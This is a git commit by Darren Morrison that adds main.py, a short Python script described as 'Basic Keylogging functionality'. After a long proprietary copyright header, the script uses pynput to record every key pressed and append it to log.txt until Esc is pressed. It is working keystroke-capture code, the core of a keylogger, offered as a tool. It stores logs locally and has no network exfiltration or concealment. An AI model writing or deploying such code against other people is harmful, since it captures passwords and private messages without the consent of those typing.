8f35b0268f4c372ab666ce352541686d93664245
DarmorGamz <darren09@live.ca>
2024-08-08 17:05:02 -0400

    first iteration

---
+++ main.py
@@ -0,0 +1,45 @@
+"""
+Basic Keylogging functionality
+"""
+#*****************************************************************************# pylint: disable=duplicate-code
+#                    C O P Y R I G H T  (c) 2024
+#                     D A R R E N   M O R R I S O N
+#                         All Rights Reserved
+#*****************************************************************************#
+# THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF DARREN MORRISON.
+# THIS SOFTWARE IS PROVIDED IN AN 'AS IS' CONDITION. NO WARRANTIES, WHETHER
+# EXPRESS, IMPLIED OR STATUTORY, INCLUDING, BUT NOT LIMITED TO, IMPLIED
+# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE APPLY TO
+# THIS SOFTWARE. THE COMPANY SHALL NOT, IN ANY CIRCUMSTANCES, BE LIABLE FOR
+# SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES, FOR ANY REASON WHATSOEVER.
+#
+#            The copyright notice above does not evidence any
+#           actual or intended publication of such source code.
+#
+# The software is owned by Darren Morrison. and/or its supplier,
+# and is protected under applicable copyright laws. All rights are reserved.
+# Any use in violation of the foregoing restrictions may subject the user to
+# criminal sanctions under applicable laws, as well as to civil liability for
+# the breach of the terms and conditions of this license.
+#*****************************************************************************#
+#*****************************************************************************#
+__file__      = "main.py"
+__copyright__ = "COPYRIGHT (c) 2024 Darren Morrison. All rights reserved"
+__author__    = "Darren Morrison"
+__version__   = "0.0.1"
+#*****************************************************************************# pylint: enable=duplicate-code
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    with open("log.txt", "a") as log_file:
+        try:
+            log_file.write(f"{key.char}")
+        except AttributeError:
+            log_file.write(f" [{key}] ")
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
